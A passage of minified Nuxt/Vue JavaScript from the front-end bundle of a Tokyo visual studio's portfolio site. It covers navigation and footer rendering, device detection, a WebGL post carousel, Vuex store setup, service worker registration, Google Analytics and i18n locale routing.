c1.3,0.3,2,0.4,2.4,1c0.3,0.6,0.8,1.1,0.9,1.3c0.1,0.2,0.3,0.1,0.2,0.4c-0.1,0.3,0,0.1,0.1,0c0.1-0.1,0,0.2,0.2,0.3 c0.2,0.1,0.2,0.2,0.1,0.4c0,0.2-0.1,0.5,0.1,2.4c0.2,1.9,2.1,6.2,3.2,6.9c0.4,0.3,1.1,0.4,1.2,0.9c0.1,0.5,0.4,0.9,0.9,1.1 c0.5,0.3,0.8,1.2,2,1.3h1.7c1.3-0.1,1.6-1,2-1.3c0.5-0.3,0.8-0.6,0.9-1.1c0.1-0.5,0.8-0.6,1.2-0.9c1-0.8,3-5,3.2-6.9 c0.2-1.9,0.1-2.2,0.1-2.4c0-0.2,0-0.3,0.1-0.4c0.2-0.1,0.1-0.4,0.2-0.3c0.1,0.1,0.2,0.3,0.1,0c-0.1-0.3,0.1-0.3,0.2-0.4 c0.2-0.2,0.6-0.7,0.9-1.3c0.3-0.6,1-0.7,2.4-1c1.3-0.3,2.8-0.4,4-1.9c1.1-1.4,2.1-2.9,2.9-4.4C69.9,50.2,71,49,70.1,48.5z"}})])])]),t._v(" "),i("a",{staticClass:"ui-toggle js--hover side no-events ui-splash-in",attrs:{href:"#"},on:{click:t.onMenuToggle,mouseenter:t.onToggleEnter}},[t._m(0)])],1)}),[function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"ui-toggle-in"},[e("div",{staticClass:"ui-toggle-body"},[e("div",{staticClass:"in"},[e("div",{staticClass:"t t1"},[e("div")]),this._v(" "),e("div",{staticClass:"t t2"},[e("div")])])])])}],!1,null,null,null).exports,siteFooter:Object(M.a)(O,(function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{staticClass:"site-footer no-events"},[i("canvas",{staticClass:"gl",attrs:{id:"js--gl-back"}}),t._v(" "),i("canvas",{staticClass:"gl",attrs:{id:"js--gl-front"}}),t._v(" "),i("div",{attrs:{id:"js--video"}}),t._v(" "),i("div",{staticClass:"js--scroll-height"}),t._v(" "),i("div",{staticClass:"site-control site-control-progress side",on:{mousedown:t.onDragStart}},[i("div",{staticClass:"in"},[i("div",{staticClass:"site-control-in ui-fade-out"},[i("div",{staticClass:"in ui-fade"},[t.user.isDesktop?i("div",{staticClass:"site-control-body flip-vr ja",attrs:{"data-type":"text"}},[t._m(0)]):t._e(),t._v(" "),t._m(1)])]),t._v(" "),i("div",{staticClass:"site-control-in ui-fade-out"},[i("div",{staticClass:"in ui-fade"},[i("div",{staticClass:"site-control-body",attrs:{"data-type":"progress"}},[i("svg",{staticClass:"progress-svg",attrs:{viewBox:"0 0 200 200"}},[i("path",{staticClass:"path progress-b",attrs:{d:"M100,20a80,80,0,1,1-80,80,80,80,0,0,1,80-80"}}),t._v(" "),i("path",{staticClass:"path progress-f",attrs:{d:"M100,20a80,80,0,1,1-80,80,80,80,0,0,1,80-80"}})])])])])])]),t._v(" "),i("div",{staticClass:"site-mask"}),t._v(" "),i("div",{staticClass:"site-loading"})])}),[function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"flip-vr-wrap"},[e("div",{staticClass:"flip-vr-body"},[e("div",{staticClass:"flex"},[e("span",{staticClass:"f ja ja2 js--slide-leave"},[this._v("読込")])])])])},function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{staticClass:"site-control-body ja",attrs:{"data-type":"counter"}},[i("div",{staticClass:"site-control-counter-body in"},[i("div",{staticClass:"site-control-counter-ol"},[i("div",{staticClass:"site-control-counter-move"},[i("span",[t._v("五")]),t._v(" "),i("span",[t._v("四")]),t._v(" "),i("span",[t._v("三")]),t._v(" "),i("span",[t._v("二")]),t._v(" "),i("span",[t._v("一")])])])])])}],!1,null,null,null).exports,siteMenu:Object(M.a)(C,(function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{staticClass:"site-nav"},[i("div",{staticClass:"in"},[t.user.isMobile?i("div",{staticClass:"ui-lang ui-fade"},["ja"===t.lang?i("nuxt-link",{staticClass:"flip-a-wrap",attrs:{to:t.switchLocalePath("en")},nativeOn:{click:function(e){return t.onNormalTransition("lang")}}},[i("div",{staticClass:"clip-w clip-p"},[i("div",{staticClass:"in flip-a ui-lang-ul clip-t"},[i("span",{staticClass:"t"},[i("span",{staticClass:"f"},[t._v("en")]),t._v(" "),i("span",{staticClass:"b",attrs:{"aria-hidden":"true"}},[t._v("en")])])])])]):i("nuxt-link",{staticClass:"flip-a-wrap",attrs:{to:t.switchLocalePath("ja")},nativeOn:{click:function(e){return t.onNormalTransition("lang")}}},[i("div",{staticClass:"clip-w clip-p"},[i("div",{staticClass:"in flip-a ui-lang-ul clip-t"},[i("span",{staticClass:"t"},[i("span",{staticClass:"f"},[t._v("ja")]),t._v(" "),i("span",{staticClass:"b",attrs:{"aria-hidden":"true"}},[t._v("ja")])])])])])],1):t._e(),t._v(" "),i("nav",{staticClass:"site-nav-body"},[i("div",{staticClass:"body"},[i("div",{staticClass:"site-nav-in in"},[i("div",{staticClass:"site-nav-left section section-information"},[t.user.isMobile?t._e():i("div",{staticClass:"site-nav-address flex-li clip-w clip-p"},[i("div",{staticClass:"clip-t"},[i("div",{staticClass:"h3"},[t._v("Japan")]),t._v(" "),t.pages.company.address_lang?i("div",{staticClass:"p"},[i("p",{domProps:{innerHTML:t._s(t.pages.company.address_lang[t.lang])}}),t._v(" "),i("a",{attrs:{href:t.pages.company.address_link,target:"_blank",rel:"noopener"}},[t._v("map")])]):t._e()])]),t._v(" "),i("div",{staticClass:"flip-btn-wrap"},[i("div",{staticClass:"clip-w clip-p"},["ja"===t.lang?i("a",{staticClass:"flip-btn flip-a clip-t",attrs:{href:"https://helixes.co/legals",target:"_blank",rel:"noopener"}},[t._m(0)]):i("a",{staticClass:"flip-btn flip-a clip-t",attrs:{href:"https://helixes.co/en/legals",target:"_blank",rel:"noopener"}},[t._m(1)])]),t._v(" "),t._m(2)])]),t._v(" "),i("ul",{staticClass:"site-nav-right site-nav-ul"},[i("li",{staticClass:"site-nav-li clip-p"},[i("div",{staticClass:"clip-w"},[i("nuxt-link",{staticClass:"site-nav-a clip-t",attrs:{to:t.localePath("works"),"data-name":"works"},nativeOn:{click:function(e){return t.onMenuTransition(e)},mouseenter:function(e){return t.onMouseEnter(e)},mouseleave:function(e){return t.onMouseLeave(e)}}},[i("span",{staticClass:"t"},[i("span",{staticClass:"f"},[i("span",{staticClass:"s"},[t._v("Works")])]),t._v(" "),i("span",{staticClass:"b gs2"},[i("span",{staticClass:"s",attrs:{"aria-hidden":"true"}},[t._v("Works")])])])])],1)]),t._v(" "),i("li",{staticClass:"site-nav-li clip-p"},[i("div",{staticClass:"clip-w"},[i("nuxt-link",{staticClass:"site-nav-a clip-t",attrs:{to:t.localePath("about"),"data-name":"about"},nativeOn:{click:function(e){return t.onMenuTransition(e)},mouseenter:function(e){return t.onMouseEnter(e)},mouseleave:function(e){return t.onMouseLeave(e)}}},[i("span",{staticClass:"t"},[i("span",{staticClass:"f"},[i("span",{staticClass:"s"},[t._v("About")])]),t._v(" "),i("span",{staticClass:"b gs2"},[i("span",{staticClass:"s",attrs:{"aria-hidden":"true"}},[t._v("About")])])])])],1)]),t._v(" "),i("li",{staticClass:"site-nav-li clip-p"},[i("div",{staticClass:"clip-w"},[i("nuxt-link",{staticClass:"site-nav-a clip-t",attrs:{to:t.localePath("contact"),"data-name":"contact"},nativeOn:{click:function(e){return t.onMenuTransition(e)},mouseenter:function(e){return t.onMouseEnter(e)},mouseleave:function(e){return t.onMouseLeave(e)}}},[i("span",{staticClass:"t"},[i("span",{staticClass:"f"},[i("span",{staticClass:"s"},[t._v("Contact")])]),t._v(" "),i("span",{staticClass:"b gs2"},[i("span",{staticClass:"s",attrs:{"aria-hidden":"true"}},[t._v("Contact")])])])])],1)]),t._v(" "),i("li",{staticClass:"site-nav-li clip-p"},[i("div",{staticClass:"clip-w"},[i("nuxt-link",{staticClass:"site-nav-a clip-t",attrs:{to:t.localePath("reel"),"data-name":"reel"},nativeOn:{click:function(e){return t.onMenuTransition(e)},mouseenter:function(e){return t.onMouseEnter(e)},mouseleave:function(e){return t.onMouseLeave(e)}}},[i("span",{staticClass:"t"},[i("span",{staticClass:"f"},[i("span",{staticClass:"s"},[t._v("Reel")])]),t._v(" "),i("span",{staticClass:"b gs2"},[i("span",{staticClass:"s",attrs:{"aria-hidden":"true"}},[t._v("Reel")])])])])],1)])])])])]),t._v(" "),t._m(3),t._v(" "),t._m(4)])])}),[function(){var t=this.$createElement,e=this._self._c||t;return e("span",{staticClass:"t"},[e("span",{staticClass:"f"},[this._v("legal mentions")]),this._v(" "),e("span",{staticClass:"b",attrs:{"aria-hidden":"true"}},[this._v("legal mentions")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("span",{staticClass:"t"},[e("span",{staticClass:"f"},[this._v("legal mentions")]),this._v(" "),e("span",{staticClass:"b",attrs:{"aria-hidden":"true"}},[this._v("legal mentions")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"clip-w clip-p"},[e("a",{staticClass:"flip-btn flip-a clip-t",attrs:{href:"https://cult.maxilla.jp/",target:"_blank",rel:"noopener"}},[e("span",{staticClass:"t"},[e("span",{staticClass:"f"},[this._v("culture")]),this._v(" "),e("span",{staticClass:"b",attrs:{"aria-hidden":"true"}},[this._v("culture")])])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("small",{staticClass:"site-copy"},[e("span",{staticClass:"clip-w clip-p"},[e("span",{staticClass:"clip-t"},[this._v("© 2019 maxilla.")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"site-nav-footer"},[e("div",{staticClass:"site-nav-sns p-r p-b"},[e("ul",[e("li",{staticClass:"clip-w clip-p"},[e("a",{staticClass:"clip-t flip-a",attrs:{href:"https://twitter.com/maxillajp",target:"_blank",rel:"noopener","aria-label":"Twitter"}},[e("span",{staticClass:"t"},[e("span",{staticClass:"i i-sns-tw f"}),this._v(" "),e("span",{staticClass:"i i-sns-tw b"})])])]),this._v(" "),e("li",{staticClass:"clip-w clip-p"},[e("a",{staticClass:"clip-t flip-a",attrs:{href:"https://www.facebook.com/maxillajp/",target:"_blank",rel:"noopener","aria-label":"Facebook"}},[e("span",{staticClass:"t"},[e("span",{staticClass:"i i-sns-fb f"}),this._v(" "),e("span",{staticClass:"i i-sns-fb b"})])])]),this._v(" "),e("li",{staticClass:"clip-w clip-p"},[e("a",{staticClass:"clip-t flip-a",attrs:{href:"https://www.instagram.com/maxillajp/",target:"_blank",rel:"noopener","aria-label":"Instagram"}},[e("span",{staticClass:"t"},[e("span",{staticClass:"i i-sns-ig f"}),this._v(" "),e("span",{staticClass:"i i-sns-ig b"})])])])])])])}],!1,null,null,null).exports},watch:{page:function(t){window.routeTransition.onInit(t)}},mounted:function(){var t=this;this.$nextTick((function(){function e(t){return-1!=window.navigator.userAgent.toLowerCase().indexOf(t)}window.__IS_PICKUP__=!1,window.WebFont=i(222),window.isMobile=i(223),window.isMobileFixed={phone:!1,tablet:!1,desktop:!0,any:!1},0===__WW__?location.reload():isMobile.phone||__WW__<640?(isMobileFixed.any=!0,isMobileFixed.phone=!0,isMobileFixed.tablet=!1,isMobileFixed.desktop=!1,$html.classList.add("is-mobile"),__LEGACY__=!1,__MIDSPEC__=!1):isMobile.tablet||__WW__<1024||!e("ipad")&&e("macintosh")&&"ontouchend"in document?(isMobileFixed.any=!0,isMobileFixed.phone=!1,isMobileFixed.tablet=!0,isMobileFixed.desktop=!1,$html.classList.add("is-tablet"),__LEGACY__=!1,__MIDSPEC__=!1):(isMobileFixed.any=!1,isMobileFixed.phone=!1,isMobileFixed.tablet=!1,isMobileFixed.desktop=!0,$html.classList.add("is-desktop")),__LOWSPEC__&&(isMobileFixed.any=!0,isMobileFixed.phone=!1,isMobileFixed.tablet=!0,isMobileFixed.desktop=!1,$html.classList.add("is-tablet")),t.$store.commit("updateUserData",{isDesktop:!isMobileFixed.any,isTablet:isMobileFixed.tablet,isMobile:isMobileFixed.phone,isLegacy:__LEGACY__,isLowspec:__LOWSPEC__,isRetina:__IS_RETINA__}),$html.classList.add("is-loading-before");var n=t.$store.getters.page.name;window.__IS_PICKUP_MAX__=8;for(var r=[],a=0;a<__IS_PICKUP_MAX__;a++)r.push(t.$store.getters.pickups[a]);for(t.$store.commit("updatePickups",r),"index___ja"===n||"index___en"===n?__PAGE_TYPE__="home":"works___ja"===n||"works-category-slug___ja"===n||"works___en"===n||"works-category-slug___en"===n?__PAGE_TYPE__="works":"reel___ja"===n||"reel___en"===n?__PAGE_TYPE__="reel":"about___ja"===n||"about___en"===n?__PAGE_TYPE__="about":"contact___ja"===n||"contact___en"===n?__PAGE_TYPE__="contact":"works-slug___ja"===n||"works-slug___en"===n?__PAGE_TYPE__="single":"404___ja"!==n&&"404___en"!==n||(__PAGE_TYPE__="404"),window.__POSTS__=[],r=[],a=t.$store.getters.pickups.length-1;a>=t.$store.getters.pickups.length-3;a--){var o=t.$store.getters.pickups[a],s={post_title_array:o.post_title_array,selected:!1,index:0,is_clone:!0,type:o.type,post_id:o.post_id,slug:o.slug,center:!1,is_loaded_data:!1,is_load_meta:!1,is_loaded_meta:!1,size:{ratio:0,origin:{w:o.size.w,h:o.size.h},scaled:{w:0,h:0},zoomed:{w:0,h:0}},title:{mesh:null,tex:null,pos:{x:0,y:0,px:0,py:0}},plane:{mesh:null,pos:{x:0,y:0,px:0,py:0}},img:{src:{d1x:o.img.src.d1x,d2x:o.img.src.d2x},tex:null},video:{el:null,tex:null,mp4:o.video.mp4,mp4_1x:o.video.mp4_1x,mp4_2x:o.video.mp4_2x,webm:o.video.webm}};r.push(s)}for(a=r.length-1;a>=0;a--)__POSTS__.push(r[a]);for(a=0;a<t.$store.getters.pickups.length;a++){var l=t.$store.getters.pickups[a],c={post_title_array:l.post_title_array,selected:!1,index:0,is_clone:!1,type:l.type,post_id:l.post_id,slug:l.slug,center:!1,is_loaded_data:!1,is_load_meta:!1,is_loaded_meta:!1,size:{ratio:0,origin:{w:l.size.w,h:l.size.h},scaled:{w:0,h:0},zoomed:{w:0,h:0}},title:{mesh:null,tex:null,pos:{x:0,y:0,px:0,py:0}},plane:{mesh:null,pos:{x:0,y:0,px:0,py:0}},img:{src:{d1x:l.img.src.d1x,d2x:l.img.src.d2x},tex:null},video:{el:null,tex:null,mp4:l.video.mp4,mp4_1x:l.video.mp4_1x,mp4_2x:l.video.mp4_2x,webm:l.video.webm}};__POSTS__.push(c)}for(a=0;a<3;a++){var h=t.$store.getters.pickups[a],u={post_title_array:h.post_title_array,selected:!1,index:0,is_clone:!0,type:h.type,post_id:h.post_id,slug:h.slug,center:!1,is_loaded_data:!1,is_load_meta:!1,is_loaded_meta:!1,size:{ratio:0,origin:{w:h.size.w,h:h.size.h},scaled:{w:0,h:0},zoomed:{w:0,h:0}},title:{mesh:null,tex:null,pos:{x:0,y:0,px:0,py:0}},plane:{mesh:null,pos:{x:0,y:0,px:0,py:0}},img:{src:{d1x:h.img.src.d1x,d2x:h.img.src.d2x},tex:null},video:{el:null,tex:null,mp4:h.video.mp4,mp4_1x:h.video.mp4_1x,mp4_2x:h.video.mp4_2x,webm:h.video.webm}};__POSTS__.push(u)}for(a=__POSTS__.length-1;a>=0;a--)__POSTS__[a].index=a;i(224),onceDOM(),onceGL()}))},computed:function(t){for(var e=1;e<arguments.length;e++){var i=null!=arguments[e]?arguments[e]:{};e%2?R(i,!0).forEach((function(e){Object(n.a)(t,e,i[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(i)):R(i).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(i,e))}))}return t}({},Object(A.b)(["pickups","page","pages","user"]))},F={_default:Object(M.a)(I,(function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{attrs:{id:"__app"}},[i("site-header",{attrs:{user:t.user,lang:this.$i18n.locale}}),t._v(" "),i("site-menu",{attrs:{user:t.user,lang:this.$i18n.locale,pages:t.pages}}),t._v(" "),i("nuxt"),t._v(" "),i("site-footer",{attrs:{pickups:t.pickups,user:t.user}})],1)}),[],!1,null,null,null).exports},N={head:{title:"maxilla",meta:[{charset:"utf-8"},{name:"viewport",content:"width=device-width, initial-scale=1"},{hid:"og:site_name",property:"og:site_name",content:"maxilla"},{hid:"og:type",property:"og:type",content:"website"},{hid:"og:title",property:"og:title",content:"maxilla"},{hid:"og:description",property:"og:description",content:"maxilla/マキシラ is a visual studio based in Tokyo city, established in 2009. We love .MOV .JPG .HTML .PDF .GIF .WAV .AI .OBJ .AEP . ... and ZIP."},{hid:"og:image",property:"og:image",content:"https://mxresource.s3-ap-northeast-1.amazonaws.com/assets/img/ogp.png"},{name:"msapplication-TileColor",content:"#040404"},{name:"theme-color",content:"#040404"},{name:"format-detection",content:"telephone=no"},{"http-equiv":"X-UA-Compatible",content:"IE=edge"},{hid:"mobile-web-app-capable",name:"mobile-web-app-capable",content:"yes"},{hid:"apple-mobile-web-app-title",name:"apple-mobile-web-app-title",content:"maxilla"},{hid:"author",name:"author",content:"Kenta Toshikura"},{hid:"description",name:"description",content:"maxilla"}],link:[{rel:"icon",type:"image/x-icon",href:"/favicon.ico"},{rel:"apple-touch-icon",sizes:"180x180",href:"/assets/img/f/apple-touch-icon.png"},{rel:"icon",type:"image/png",sizes:"32x32",href:"/assets/img/f/favicon-32x32.png"},{rel:"icon",type:"image/png",sizes:"16x16",href:"/assets/img/f/favicon-16x16.png"},{rel:"mask-icon",color:"#040404",href:"/assets/img/f/safari-pinned-tab.svg"},{rel:"manifest",href:"/assets/img/f/manifest.json"},{rel:"preconnect",href:"https://maxilla.jp"},{rel:"preconnect",href:"https://cdn.jsdelivr.net"},{rel:"preconnect",href:"https://rebel-sam.s3.eu-west-2.amazonaws.com"},{rel:"preconnect",href:"https://wp.maxilla.jp"}],style:[],script:[{src:"https://www.googletagmanager.com/gtag/js?id=UA-34616605-1",async:!0}],htmlAttrs:{lang:"en"}},render:function(t,e){var i=t(this.layout||"nuxt"),n=t("div",{domProps:{id:"__layout"},key:this.layoutName},[i]),r=t("transition",{props:{name:"layout",mode:"out-in"},on:{beforeEnter:function(t){window.$nuxt.$nextTick((function(){window.$nuxt.$emit("triggerScroll")}))}}},[n]);return t("div",{domProps:{id:"__nuxt"}},[r])},data:function(){return{isOnline:!0,layout:null,layoutName:""}},beforeCreate:function(){r.a.util.defineReactive(this,"nuxt",this.$options.nuxt)},created:function(){r.a.prototype.$nuxt=this,window.$nuxt=this,this.refreshOnlineStatus(),window.addEventListener("online",this.refreshOnlineStatus),window.addEventListener("offline",this.refreshOnlineStatus),this.error=this.nuxt.error,this.context=this.$options.context},computed:{isOffline:function(){return!this.isOnline}},methods:{refreshOnlineStatus:function(){void 0===window.navigator.onLine?this.isOnline=!0:this.isOnline=window.navigator.onLine},refresh:function(){var t,e,i=this;return regeneratorRuntime.async((function(n){for(;;)switch(n.prev=n.next){case 0:if((t=Object(u.f)(this.$route)).length){n.next=3;break}return n.abrupt("return");case 3:return e=t.map((function(t){var e=[];return t.$options.fetch&&e.push(Object(u.m)(t.$options.fetch,i.context)),t.$options.asyncData&&e.push(Object(u.m)(t.$options.asyncData,i.context).then((function(e){for(var i in e)r.a.set(t.$data,i,e[i])}))),Promise.all(e)})),n.prev=4,n.next=7,regeneratorRuntime.awrap(Promise.all(e));case 7:n.next=13;break;case 9:n.prev=9,n.t0=n.catch(4),Object(u.i)(n.t0),this.error(n.t0);case 13:case"end":return n.stop()}}),null,this,[[4,9]])},setLayout:function(t){return t&&F["_"+t]||(t="default"),this.layoutName=t,this.layout=F["_"+t],this.layout},loadLayout:function(t){return t&&F["_"+t]||(t="default"),Promise.resolve(F["_"+t])}}};i(101),i(71),i(33),r.a.use(A.a);var z=["state","getters","actions","mutations"],D={};(D=function(t,e){if((t=t.default||t).commit)throw new Error("[nuxt] ".concat(e," should export a method that returns a Vuex instance."));return"function"!=typeof t&&(t=Object.assign({},t)),W(t,e)}(i(225),"store/index.js")).modules=D.modules||{},H(i(115),"actions.js"),H(i(116),"getters.js"),H(i(117),"mutations.js");var G,U,B,j=D instanceof Function?D:function(){return new A.a.Store(Object.assign({strict:!1},D))};function W(t,e){if(t.state&&"function"!=typeof t.state){var i=Object.assign({},t.state);t=Object.assign({},t,{state:function(){return i}})}return t}function H(t,e){t=t.default||t;var i=e.replace(/\.(js|mjs)$/,"").split("/"),n=i[i.length-1];if("store/".concat(e),t="state"===n?function(t,e){if("function"!=typeof t){var i=Object.assign({},t);return function(){return i}}return W(t)}(t):W(t),z.includes(n)){var r=n;Y(V(D,i,{isProperty:!0}),t,r)}else{"index"===n&&(i.pop(),n=i[i.length-1]);var a=V(D,i),o=!0,s=!1,l=void 0;try{for(var c,h=z[Symbol.iterator]();!(o=(c=h.next()).done);o=!0){var u=c.value;Y(a,t[u],u)}}catch(t){s=!0,l=t}finally{try{o||null==h.return||h.return()}finally{if(s)throw l}}!1===t.namespaced&&delete a.namespaced}}function V(t,e){var i=(arguments.length>2&&void 0!==arguments[2]?arguments[2]:{}).isProperty,n=void 0!==i&&i;if(!e.length||n&&1===e.length)return t;var r=e.shift();return t.modules[r]=t.modules[r]||{},t.modules[r].namespaced=!0,t.modules[r].modules=t.modules[r].modules||{},V(t.modules[r],e,{isProperty:n})}function Y(t,e,i){e&&("state"===i?t.state=e||t.state:t[i]=Object.assign({},t[i],e))}window.$workbox=regeneratorRuntime.async((function(t){for(;;)switch(t.prev=t.next){case 0:if(!(!1 in navigator)){t.next=2;break}throw new Error("serviceWorker is not supported in current browser!");case 2:return t.next=4,regeneratorRuntime.awrap(i.e(12).then(i.bind(null,279)));case 4:return G=t.sent,U=G.Workbox,B=new U("/sw.js",{scope:"/"}),t.next=9,regeneratorRuntime.awrap(B.register());case 9:return t.abrupt("return",B);case 10:case"end":return t.stop()}})).catch((function(t){}));var X=function(t,e){var i=t.app.router;function n(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("gtag",n),n("js",new Date),n("config","UA-34616605-1"),i.afterEach((function(t){n("config","UA-34616605-1",{page_path:t.fullPath})}))},$=(i(109),i(176)),q=i(74),Z=i(0),K=i(50);function J(t,e){var i=Object.keys(t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(t);e&&(n=n.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),i.push.apply(i,n)}return i}function Q(t){for(var e=1;e<arguments.length;e++){var i=null!=arguments[e]?arguments[e]:{};e%2?J(i,!0).forEach((function(e){Object(n.a)(t,e,i[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(i)):J(i).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(i,e))}))}return t}function tt(t,e){return function(i,n){if(i){var r=this[t];if(Z.u===Z.g.NO_PREFIX&&n&&r.locale,n=n||r.locale){"string"==typeof i&&(i={name:i});var a=Object.assign({},i);if(i.path&&!i.name){var o=n===Z.j&&Z.u===Z.g.PREFIX_EXCEPT_DEFAULT||Z.u===Z.g.NO_PREFIX||r.differentDomains?i.path:"/".concat(n).concat(i.path);a.path=o}else{var s=i.name+(Z.u===Z.g.NO_PREFIX?"":Z.t+n);n===Z.j&&Z.u===Z.g.PREFIX_AND_DEFAULT&&(s+=Z.t+Z.k),a.name=s;var l=a.params;l&&void 0===l[0]&&l.pathMatch&&(l[0]=l.pathMatch)}return this[e].resolve(a).route.fullPath}}}}function et(t){return function(e){Z.u===Z.g.NO_PREFIX&&e&&this[t].locale;var i=this.getRouteBaseName();if(!i)return"";var n=this.$route,r=n.params,a=Object($.a)(n,["params"]),o={};Z.w&&this.$store&&(o=this.$store.getters["".concat(Z.w.moduleName,"/localeRouteParams")](e));var s=Object.assign({},a,{name:i,params:Q({},r,{},o,{0:r.pathMatch})}),l=this.localePath(s,e);if(this[t].differentDomains){var c=this[t].locales.find((function(t){return t[Z.b]===e}));c&&c[Z.c]&&(l=window.location.protocol.split(":")[0]+"://"+c[Z.c]+l)}return l}}function it(t){var e=t?function(e){return e||t}:function(t){return t||this.$route};return function(t){return(t=e.call(this,t)).name?t.name.split(Z.t)[0]:null}}q.a.i18n=function(t){var e,i,n,r,a;return regeneratorRuntime.async((function(o){for(;;)switch(o.prev=o.next){case 0:if(e=t.app,i=t.route,n=t.redirect,!t.isHMR){o.next=3;break}return o.abrupt("return");case 3:if("/"!==i.path||!Z.s){o.next=6;break}return n("/"+Z.s,i.query),o.abrupt("return");case 6:if(e.i18n.__route=i,o.t0=Z.l,!o.t0){o.next=12;break}return o.next=11,regeneratorRuntime.awrap(e.i18n.__detectBrowserLanguage(i));case 11:o.t0=o.sent;case 12:if(!o.t0){o.next=14;break}return o.abrupt("return");case 14:return r=e.i18n.locale||e.i18n.defaultLocale||null,a=Object(K.getLocaleFromRoute)(i),o.next=18,regeneratorRuntime.awrap(e.i18n.setLocale(a||r));case 18:case"end":return o.stop()}}))};var nt={install:function(t){t.mixin({methods:{localePath:tt("$i18n","$router"),switchLocalePath:et("$i18n"),getRouteBaseName:it()}})}},rt=function(t){var e=t.app,i=t.route;r.a.use(nt),e.localePath=tt("i18n","router"),e.switchLocalePath=et("i18n"),e.getRouteBaseName=it(i)},at=(i(84),i(230),i(120)),ot=i.n(at),st=i(121),lt=i(17),ct=function(){var t=this;if(!(a.a.hasMetaInfo?a.a.hasMetaInfo(this):this._hasMetaInfo)||!this.$i18n||!this.$i18n.locale||!this.$i18n.locales||!1===this.$options[Z.a]||this.$options[Z.a]&&!1===this.$options[Z.a].seo)return{};var e=this.$i18n.locales.find((function(e){return e[Z.b]===t.$i18n.locale})),i={};e&&e[Z.e]&&(i.lang=e[Z.e]);var n=[];if(Z.u!==Z.g.NO_PREFIX&&n.push.apply(n,Object(lt.a)(this.$i18n.locales.map((function(e){return e[Z.e]?{hid:"alternate-hreflang-"+e[Z.e],rel:"alternate",href:Z.h+t.switchLocalePath(e.code),hreflang:e[Z.e]}:null})).filter((function(t){return!!t})))),Z.u===Z.g.PREFIX_AND_DEFAULT){var r=this.switchLocalePath(e[Z.b]);r&&r!==this.$route.path&&n.push({hid:"canonical-lang-"+e[Z.b],rel:"canonical",href:Z.h+r})}var o=[];return e&&e[Z.e]&&o.push({hid:"og:locale",property:"og:locale",content:e[Z.e].replace(/-/g,"_")}),o.push.apply(o,Object(lt.a)(this.$i18n.locales.filter((function(t){return t[Z.e]&&t[Z.e]!==e[Z.e]})).map((function(t){return{hid:"og:locale:alternate-"+t[Z.e],property:"og:locale:alternate",content:t[Z.e].replace(/-/g,"_")}})))),{htmlAttrs:i,link:n,meta:o}};function ht(t,e){var i=Object.keys(t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(t);e&&(n=n.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),i.push.apply(i,n)}return i}function ut(t){for(var e=1;e<arguments.length;e++){var i=null!=arguments[e]?arguments[e]:{};e%2?ht(i,!0).forEach((function(e){Object(n.a)(t,e,i[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(i)):ht(i).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(i,e))}))}return t}r.a.use(st.a);var dt,pt,ft,mt,_t,gt,vt,yt,xt,bt,wt,Tt,St=function(t){var e,n,a,o,s,l,c,h,u,d,p,f,m,_;return regeneratorRuntime.async((function(g){for(;;)switch(g.prev=g.next){case 0:return e=t.app,n=t.route,a=t.store,o=t.req,t.res,s=t.redirect,Z.w&&a&&a.registerModule(Z.w.moduleName,{namespaced:!0,state:function(){return ut({},Z.w.syncLocale?{locale:""}:{},{},Z.w.syncMessages?{messages:{}}:{},{},Z.w.syncRouteParams?{routeParams:{}}:{})},actions:ut({},Z.w.syncLocale?{setLocale:function(t,e){(0,t.commit)("setLocale",e)}}:{},{},Z.w.syncMessages?{setMessages:function(t,e){(0,t.commit)("setMessages",e)}}:{},{},Z.w.syncRouteParams?{setRouteParams:function(t,e){(0,t.commit)("setRouteParams",e)}}:{}),mutations:ut({},Z.w.syncLocale?{setLocale:function(t,e){t.locale=e}}:{},{},Z.w.syncMessages?{setMessages:function(t,e){t.messages=e}}:{},{},Z.w.syncRouteParams?{setRouteParams:function(t,e){t.routeParams=e}}:{}),getters:ut({},Z.w.syncRouteParams?{localeRouteParams:function(t){var e=t.routeParams;return function(t){return e[t]||{}}}}:{})},{preserveState:!!a.state[Z.w.moduleName]}),l=Z.l.useCookie,c=Z.l.cookieKey,h=function(){if(l)return ot.a.get(c)},u=function(t){if(l){var e=new Date;ot.a.set(c,t,{expires:new Date(e.setDate(e.getDate()+365)),path:"/"})}},d=function(n){var r,o,c,h,u,d,p,f,m,_=arguments;return regeneratorRuntime.async((function(g){for(;;)switch(g.prev=g.next){case 0:if(r=_.length>1&&void 0!==_[1]?_[1]:{},o=r.initialSetup,(c=void 0!==o&&o)||!e.i18n.differentDomains){g.next=3;break}return g.abrupt("return");case 3:if(n!==e.i18n.locale){g.next=5;break}return g.abrupt("return");case 5:if(h=e.i18n.locale,c||(e.i18n.beforeLanguageSwitch(h,n),l&&e.i18n.setLocaleCookie(n)),!Z.o){g.next=14;break}if(u=i(50),d=u.loadLanguageAsync,!e.i18n.fallbackLocale||n===e.i18n.fallbackLocale){g.next=12;break}return g.next=12,regeneratorRuntime.awrap(d(t,e.i18n.fallbackLocale));case 12:return g.next=14,regeneratorRuntime.awrap(d(t,n));case 14:return 